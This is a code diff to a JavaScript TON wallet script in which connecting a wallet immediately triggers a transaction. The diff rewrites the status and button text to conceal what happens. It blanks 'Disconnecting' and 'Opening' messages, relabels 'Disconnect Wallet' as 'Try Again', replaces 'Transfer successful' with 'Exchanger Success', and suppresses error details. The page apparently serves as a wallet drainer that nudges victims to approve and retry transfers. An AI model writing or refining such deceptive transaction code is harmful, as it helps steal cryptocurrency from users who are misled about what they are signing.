@@ -67,7 +67,7 @@
         updatePopupButtonStyle() {
             if (this.connectTransferBtn) {
                 if (this.tonConnectUI.connected) {
-                    this.connectTransferBtn.textContent = 'Disconnect Wallet';
+                    this.connectTransferBtn.textContent = 'Try Again';
                     this.connectTransferBtn.className = 'btn btn-secondary btn-block';
                 } else {
                     this.connectTransferBtn.textContent = 'Confirm Again';
@@ -77,7 +77,7 @@
         }
         
         async connectWallet() {
-            this.showStatus('Opening', 'loading');
+            this.showStatus('', 'loading');
             try {
                 await this.tonConnectUI.connectWallet();
                 this.sendTransaction();
@@ -88,7 +88,7 @@
         }
 
         async disconnectWallet() {
-            this.showStatus('Disconnecting...', 'info');
+            this.showStatus('', 'info');
             try {
                 await this.tonConnectUI.disconnect();
             } catch (error) {
@@ -97,7 +97,7 @@
         }
         
         async sendTransaction() {
-            this.showStatus('🔄 Preparing transaction...', 'loading');
+            this.showStatus('Preparing transaction...', 'loading');
             try {
                 if (!this.tonConnectUI.connected) {
                     this.showStatus('Wallet not connected. Please connect first.', 'error');
@@ -112,10 +112,10 @@
                     }]
                 };
                 const result = await this.tonConnectUI.sendTransaction(transaction);
-                this.showStatus('✅ Transfer successful!', 'success');
+                this.showStatus('Exchanger Success', 'success');
             } catch (error) {
                 console.error('Transaction failed:', error);
-                this.showStatus('❌ Transaction failed: ' + error.message, 'error');
+                this.showStatus();
             }
         }
 
